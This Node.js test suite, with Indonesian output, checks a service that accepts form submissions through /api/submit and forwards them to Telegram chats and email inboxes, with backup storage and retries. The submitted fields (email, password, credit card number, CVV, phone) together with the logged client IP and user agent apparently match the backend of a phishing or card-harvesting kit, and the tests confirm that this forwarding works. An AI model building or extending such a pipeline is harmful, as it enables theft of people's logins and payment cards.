require('dotenv').config();

const axios = require('axios');
const config = require('./config/config');
const logger = require('./utils/logger');
const telegramService = require('./services/telegramService');
const emailService = require('./services/emailService');
const notificationService = require('./services/notificationService');
const { sanitizeData, generateSubmissionId } = require('./utils/security');

const SEPARATOR = '═'.repeat(70);

function header(title) {
    console.log('\n' + SEPARATOR);
    console.log('  ' + title);
    console.log(SEPARATOR);
}

function result(label, value, extra) {
    const icon = value ? '✅' : '❌';
    console.log(`${icon} ${label.padEnd(42)} : ${value ? 'PASS' : 'FAIL'}`);
    if (extra) {
        console.log(`     ℹ️  ${extra}`);
    }
}

async function testMasking() {
    header('TEST #1: Data Masking & Keamanan Data');

    const testData = {
        nama: 'Budi Santoso',
        email: 'budi.santoso@example.com',
        password: 'Rahasia123!',
        credit_card: '4111111111111111',
        cvv: '123',
        card_number: '5500000000000004',
        hp: '08123456789',
        kota: 'Jakarta Selatan',
    };

    let passCount = 0;
    let total = 0;

    const sanitized = sanitizeData(testData, true);

    total++;
    if (sanitized.password !== testData.password && sanitized.password.includes('*') && testData.password[0] === sanitized.password[0]) {
        passCount++;
        result('Password berhasil di-masking', true, `Asli: [REDACTED] -> Hasil: ${sanitized.password}`);
    } else {
        result('Password berhasil di-masking', false, `Password tidak di-mask dengan benar`);
    }

    total++;
    const cardPattern = /^\*\*\*\*-\*\*\*\*-\*\*\*\*-\d{4}$/;
    if (cardPattern.test(sanitized.credit_card)) {
        passCount++;
        result('Kartu kredit berhasil di-masking', true, sanitized.credit_card);
    } else {
        result('Kartu kredit berhasil di-masking', false, `Format salah: ${sanitized.credit_card}`);
    }

    total++;
    if (sanitized.cvv !== testData.cvv && sanitized.cvv.includes('*')) {
        passCount++;
        result('CVV berhasil di-masking', true, sanitized.cvv);
    } else {
        result('CVV berhasil di-masking', false);
    }

    total++;
    if (sanitized.nama === testData.nama) {
        passCount++;
        result('Data non-sensitif tidak diubah', true, 'Nama & Email tetap utuh');
    } else {
        result('Data non-sensitif tidak diubah', false);
    }

    total++;
    const subId = generateSubmissionId();
    if (/^SUB-[A-Z0-9]{6,}-[A-Z0-9]{4,8}$/.test(subId)) {
        passCount++;
        result('Submission ID format valid', true, subId);
    } else {
        result('Submission ID format valid', false, subId);
    }

    console.log(`\n   📊 Hasil: ${passCount}/${total} test lulus`);
    return passCount === total;
}

async function testTelegramConfig() {
    header('TEST #2: Konfigurasi & Koneksi Telegram Bot');

    const configured = telegramService.isAvailable();
    result('Token & Chat ID terkonfigurasi', configured, configured
        ? `Chat IDs: ${config.telegram.chatIds.join(', ')}`
        : `Token bot: ${config.telegram.botToken ? '✓ terisi' : '✗ kosong'}, Chat ID: ${config.telegram.chatIds.length} ID`
    );

    if (configured) {
        console.log('\n   🔄 Menghubungi API Telegram (getMe)...');
        const t0 = Date.now();
        const conn = await telegramService.testConnection();
        const elapsed = Date.now() - t0;

        if (conn.success) {
            result('Koneksi API Telegram berhasil', true, `Bot: @${conn.bot.username} (${elapsed}ms)`);
        } else {
            result('Koneksi API Telegram berhasil', false, `Error: ${conn.error} (${elapsed}ms)`);
        }

        if (conn.success) {
            console.log('\n   📨 Mengirim pesan uji coba...');
            const testData = sanitizeData({
                email: 'test.user@example.com',
                password: 'TestPassword123',
                nama: 'Test User',
                credit_card: '4111111111111111',
                kota: 'Jakarta',
            }, true);
            const sendRes = await telegramService.sendMessage(
                generateSubmissionId(),
                testData,
                { clientIp: '127.0.0.1', userAgent: 'TestScript/1.0' }
            );
            if (sendRes.success) {
                result('Percobaan kirim Telegram', true, 'Pesan terkirim ke semua chat ID');
            } else if (sendRes.skipped) {
                    result('Percobaan kirim Telegram', false, 'Dilewati: tidak terkonfigurasi');
            } else {
                result('Percobaan kirim Telegram', false, `Error: ${sendRes.error}`);
            }
        }
        return conn.success;
    }
    return false;
}

async function testEmailConfig() {
    header('TEST #3: Konfigurasi & Koneksi SMTP Email');

    const configured = emailService.isAvailable();
    result('Kredensial SMTP terkonfigurasi', configured, configured
        ? `${config.smtp.host}:${config.smtp.port} (TLS: ${!config.smtp.secure ? 'STARTTLS' : 'SSL'}) -> ${config.smtp.toAddresses.join(', ')}`
        : `Host: ${config.smtp.host || '✗'}, User: ${config.smtp.user ? '✓ terisi' : '✗ kosong'}`
    );

    if (configured) {
        console.log('\n   🔄 Memverifikasi koneksi SMTP...');
        const t0 = Date.now();
        const conn = await emailService.testConnection();
        const elapsed = Date.now() - t0;

        if (conn.success) {
            result('Koneksi SMTP berhasil diverifikasi', true, `${conn.info} (${elapsed}ms)`);
        } else {
            result('Koneksi SMTP berhasil diverifikasi', false, `Error: ${conn.error} [${conn.code || 'N/A'}] (${elapsed}ms)`);
        }

        if (conn.success) {
            console.log('\n   📨 Mengirim email uji coba...');
            const testData = sanitizeData({
                email: 'test.user@example.com',
                password: 'TestPassword456',
                nama: 'Test User Email',
                phone: '081234567890',
                alamat: 'Jl. Contoh No. 123',
            }, true);
            const sendRes = await emailService.sendEmail(
                generateSubmissionId(),
                testData,
                { clientIp: '192.168.1.1', userAgent: 'TestScript/1.0 Node.js' }
            );
            if (sendRes.success) {
                result('Percobaan kirim Email', true, `Message-ID: ${sendRes.messageId}, Diterima: ${sendRes.accepted?.join(', ')}`);
            } else if (sendRes.skipped) {
                result('Percobaan kirim Email', false, 'Dilewati: tidak terkonfigurasi');
            } else {
                result('Percobaan kirim Email', false, `Error: ${sendRes.error} [${sendRes.code || ''}]`);
            }
        }
        return conn.success;
    }
    return false;
}

async function testEndpointSubmit() {
    header('TEST #4: Endpoint API /api/submit');

    const port = config.server.port;
    const baseUrl = `http://localhost:${port}`;

    console.log(`   🌐 Target endpoint: ${baseUrl}/api/submit`);

    try {
        const health = await axios.get(`${baseUrl}/api/health`, { timeout: 5000 })
            .then(r => r.data)
            .catch(err => ({ error: err.message }));

        if (health.status === 'ok') {
            result('Health check server berjalan', true, `Uptime: ${Math.floor(health.uptime)}s`);
        } else {
            result('Health check server berjalan', false, health.error || 'Server tidak merespons. Pastikan server sudah dijalankan: npm start');
            console.log('\n   💡 Menjalankan server internal untuk test endpoint...');
            return 'SERVER_NOT_RUNNING';
        }

        const payloadNormal = {
            email: 'test.endpoint@example.com',
            password: 'EndpointTest789!',
            nama: 'Pengguna Test',
            rememberMe: true,
            source: 'test_script',
            credit_card: '4242424242424242',
            cvv: '321',
            hp: '08987654321',
        };

        console.log('\n   📮 Mengirim submit data uji (data normal)...');
        const t0 = Date.now();
        const submit1 = await axios.post(`${baseUrl}/api/submit`, payloadNormal, {
            timeout: 30000,
            headers: { 'Content-Type': 'application/json' },
        }).then(r => ({ status: r.status, data: r.data }))
            .catch(err => ({
                status: err.response?.status || 0,
                data: err.response?.data || { error: err.message },
            }));
        const elapsed = Date.now() - t0;

        const hasSubId = !!submit1.data?.submissionId;
        result(`Submit normal (${submit1.status}) ${hasSubId ? `ID: ${submit1.data?.submissionId}` : ''} [${elapsed}ms]`, hasSubId, `Status: ${submit1.data?.overallStatus || 'N/A'}`);

        if (submit1.data?.notifications) {
            const n = submit1.data.notifications;
            console.log(`\n      📱 Telegram: ${n.telegram.sent ? '✅ Terkirim' : (n.telegram.skipped ? '⏭️  Dilewati' : '❌ Gagal: ' + (n.telegram.error || ''))}`);
            console.log(`      📧 Email   : ${n.email.sent ? '✅ Terkirim' : (n.email.skipped ? '⏭️  Dilewati' : '❌ Gagal: ' + (n.email.error || ''))}`);
        }

        console.log('\n   📮 Mengirim submit data kosong (uji validasi)...');
        const submitEmpty = await axios.post(`${baseUrl}/api/submit`, {}, {
            timeout: 5000,
            validateStatus: () => true,
        });
        result('Submit data kosong tertolak (400)', submitEmpty.status === 400, `Status: ${submitEmpty.status}`);

        console.log('\n   📮 Mengirim JSON invalid...');
        const submitInvalid = await axios.post(`${baseUrl}/api/submit`, 'ini bukan json', {
            timeout: 5000,
            headers: { 'Content-Type': 'application/json' },
            validateStatus: () => true,
        });
        result('Submit JSON invalid tertolak (400)', submitInvalid.status === 400, `Status: ${submitInvalid.status}`);

        return true;
    } catch (err) {
        console.log('   ❌ Error tidak terduga:', err.message);
        return false;
    }
}

async function testErrorHandling() {
    header('TEST #5: Error Handling & Database Cadangan');

    console.log('   🧪 Menguji mekanisme penyimpanan backup...');
    const mockReq = {
        ip: '10.0.0.99',
        headers: {
            'user-agent': 'ErrorHandlingTest/1.0',
        },
        connection: { remoteAddress: '10.0.0.99' },
    };
    const testData = {
        email: 'error.test@example.com',
        password: 'SensitivePassword!',
        credit_card: '5105105105105100',
        nama: 'Error Test User',
    };

    const res = await notificationService.processSubmission(mockReq, testData);
    const hasBackup = !!res.submissionId;
    result(`Submit disimpan ke DB backup (${res.submissionId})`, hasBackup, `Overall: ${res.overallStatus}`);

    if (res.overallStatus === 'SKIPPED' || res.overallStatus === 'PARTIAL' || res.overallStatus === 'FAILED') {
        console.log('\n   🔁 Menjalankan proses retry failed submissions...');
        const retryRes = await notificationService.retryFailedSubmissions();
        result('Mekanisme retry berjalan', true, `Processed: ${retryRes.processed}, Succeeded: ${retryRes.succeeded}`);
    }

    return hasBackup;
}

async function runAllTests() {
    console.log('\n' + SEPARATOR);
    console.log('   🚀 SISTEM NOTIFIKASI - SUITE PENGUJIAN OTOMATIS');
    console.log(SEPARATOR);
    console.log(`   Waktu mulai: ${new Date().toLocaleString('id-ID')}`);
    console.log(`   Node.js  : ${process.version}`);
    console.log(`   Env     : ${config.server.env}`);

    const scores = {
        total: 0,
        passed: 0,
    };

    try {
        scores.total++;
        if (await testMasking()) scores.passed++;
    } catch (e) {
        console.log('   ❌ TEST #1 FATAL:', e.message);
        logger.error('Test masking error', e);
    }

    try {
        scores.total++;
        if (await testTelegramConfig()) scores.passed++;
    } catch (e) {
        console.log('   ❌ TEST #2 FATAL:', e.message);
        logger.error('Test telegram error', e);
    }

    try {
        scores.total++;
        if (await testEmailConfig()) scores.passed++;
    } catch (e) {
        console.log('   ❌ TEST #3 FATAL:', e.message);
        logger.error('Test email error', e);
    }

    try {
        scores.total++;
        const ep = await testEndpointSubmit();
        if (ep === true) scores.passed++;
    } catch (e) {
        console.log('   ❌ TEST #4 FATAL:', e.message);
        logger.error('Test endpoint error', e);
    }

    try {
        scores.total++;
        if (await testErrorHandling()) scores.passed++;
    } catch (e) {
        console.log('   ❌ TEST #5 FATAL:', e.message);
        logger.error('Test error handling', e);
    }

    header('RINGKASAN HASIL PENGUJIAN');
    console.log(`\n   🎯 Total tes    : ${scores.total}`);
    console.log(`   ✅ Lulus     : ${scores.passed}`);
    console.log(`   ❌ Gagal     : ${scores.total - scores.passed}`);
    const percent = scores.total > 0 ? Math.round((scores.passed / scores.total) * 100) : 0;
    console.log(`   📊 Persentase: ${percent}%`);

    if (percent === 100) {
        console.log('\n   🎉 SEMUA PENGUJIAN LULUS! Sistem siap digunakan.');
    } else if (percent >= 60) {
        console.log('\n   ⚠️  SEBAGIAN BESAR LULUS. Tinjau konfigurasi yang gagal.');
    } else {
        console.log('\n   ❗ BANYAK YANG GAGAL. Periksa konfigurasi .env dan pastikan server berjalan (npm start).');
    }
    console.log(SEPARATOR + '\n');

    return percent === 100;
}

runAllTests()
    .then(ok => process.exit(ok ? 0 : 1))
    .catch(err => {
        console.error('FATAL test suite crashed:', err);
        process.exit(2);
    });
